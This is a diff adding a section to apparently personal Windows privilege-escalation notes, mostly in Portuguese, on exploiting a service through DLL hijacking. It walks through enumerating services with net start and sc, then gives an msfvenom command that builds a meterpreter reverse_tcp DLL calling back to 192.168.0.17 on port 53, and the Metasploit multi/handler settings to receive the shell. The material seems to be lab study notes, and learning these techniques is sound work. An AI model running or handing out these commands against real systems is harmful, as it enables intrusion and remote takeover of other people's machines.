@@ -71,6 +71,43 @@ List users in administrators group
 ----------------------------------------------------------------------------------------------------------------------------------------
 ### 02 - Exploitation - Services (DLL Hijacking)
 
+List services and search any suspect
+
+> net start
+
+(DLL Hijack Service) parece ser suspect.
+
+Depois, procure o nome desse service suspect. No exemplo usamos o (DLL Hijack Service)
+
+> sc queryex type= service state= all |findstr /i "DLL"
+
+Encontramos algumas strings que possuem o nome "DLL", vamos verificar as relacoes entre eles. Alem do (dllsvc) que encontrei, existia mais outros 2. Vou comecar por ele entao.
+
+> sc qc dllsvc
+
+Bom, na descricao ele encontra-se vinculado com o (DLL Hijack Service), que no caso eh referente ao PATH.
+
+Precisamos encontrar agora a dll equivalente ao servico.
+
+
+###
+gerando a dll maliciosa para ser substituida e carregada com o servico for iniciado novamente.
+
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.17 LPORT=53 -f dll > nomedadll_relacionada_E_ser_substituida.dll
+
+agora iniciamos o modo handler.
+
+$ use exploit/multi/handler
+
+    set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+    set LHOST 192.168.0.17
+
+    set LPORT 53
+
+    exploit
+
+
 
 
 
